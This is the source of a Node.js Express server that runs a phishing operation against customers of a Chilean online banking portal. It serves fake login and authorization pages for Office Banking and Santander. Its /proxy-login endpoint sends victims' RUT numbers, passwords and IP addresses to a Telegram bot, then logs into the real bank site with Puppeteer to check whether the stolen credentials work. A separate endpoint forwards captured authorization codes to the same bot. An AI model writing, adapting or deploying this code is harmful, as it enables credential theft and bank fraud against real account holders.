const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const puppeteer = require("puppeteer");
// Si tu Node es <18, instala node-fetch y descomenta:
// const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  res.json(cfg);
});

// Endpoint para procesar saldo directamente (flujo original)
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
  res.json(req.body);
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

  if (cfg.tipoAutorizacion === "santander") {
    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
    return;
  }

  if (cfg.tipoAutorizacion === "coordenadas") {
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
    return;
  }

  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para login → notifica ingreso y valida credenciales por respuesta de red
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (mail) {
    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });
    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
  }

  // Notificación básica de ingreso (flujo original)
  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
  });

  let mensajeFinal = "Bienvenido a Office Banking";

  try {
    if (rut && passwd) {
      const browser = await puppeteer.launch({ headless: true });
      const page = await browser.newPage();

      let loginStatus = null;

      // Escuchar respuestas de red
      page.on('response', async (response) => {
        const url = response.url();
        if (url.includes('/login')) {
          const status = response.status();
          console.log("➡️ Respuesta de login:", status, url);

          if (status === 401) loginStatus = 'error';
          else if (status === 200) loginStatus = 'ok';
        }
      });

      await page.goto('https://empresas.officebanking.cl', { waitUntil: 'networkidle2' });
      await page.waitForSelector('iframe');
      const frameHandle = await page.$('iframe');
      const frame = await frameHandle.contentFrame();

      if (frame) {
        await frame.type('#username', rut);
        await frame.type('#password', passwd);
        await frame.click('#doLoginButton');

        // Esperar unos segundos a que llegue la respuesta
        await page.waitForTimeout(4000);

        if (loginStatus === 'error') {
          mensajeFinal = "Credenciales incorrectas";
          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
          });
        } else if (loginStatus === 'ok') {
          mensajeFinal = "Credenciales correctas";
          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
          });
        }
      }

      await browser.close();
    }
  } catch (err) {
    console.error("⚠️ Error en validación de credenciales:", err);
    mensajeFinal = "Bienvenido a Office Banking"; // flujo sigue igual
  }

  res.json({ status: "ok", mensaje: mensajeFinal });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
